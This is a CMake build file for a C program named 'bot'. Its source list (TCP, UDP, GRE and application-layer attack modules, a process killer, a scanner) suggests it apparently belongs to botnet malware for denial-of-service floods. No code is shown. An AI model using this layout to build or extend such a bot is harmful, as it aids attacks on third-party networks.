cmake_minimum_required(VERSION 3.10)
project(bot C)

set(CMAKE_C_STANDARD 11)

include_directories(.)

add_executable(bot
        attack.c
        attack.h
        attack_app.c
        attack_gre.c
        attack_tcp.c
        attack_udp.c
        checksum.c
        checksum.h
        includes.h
        killer.c
        killer.h
        main.c
        protocol.h
        rand.c
        rand.h
        resolv.c
        resolv.h
        scanner.c
        scanner.h
        table.c
        table.h
        util.c
        util.h)
